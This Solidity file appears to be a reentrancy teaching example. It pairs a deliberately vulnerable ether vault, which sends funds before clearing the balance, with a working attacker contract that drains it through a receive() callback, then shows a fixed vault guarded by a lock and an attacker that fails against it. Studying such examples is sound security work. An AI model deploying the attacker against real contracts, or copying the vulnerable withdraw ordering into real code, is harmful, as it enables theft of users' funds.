// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableEtherVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");

        balances[msg.sender] = 0;
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyAttacker {
    VulnerableEtherVault public immutable target;
    uint256 public attackAmount;

    constructor(address targetAddress) {
        target = VulnerableEtherVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "seed required");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw();
        }
    }
}

contract FixedEtherVault {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract FailedReentrancyAttacker {
    FixedEtherVault public immutable target;
    uint256 public attackAmount;

    constructor(address targetAddress) {
        target = FixedEtherVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "seed required");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw();
        }
    }
}
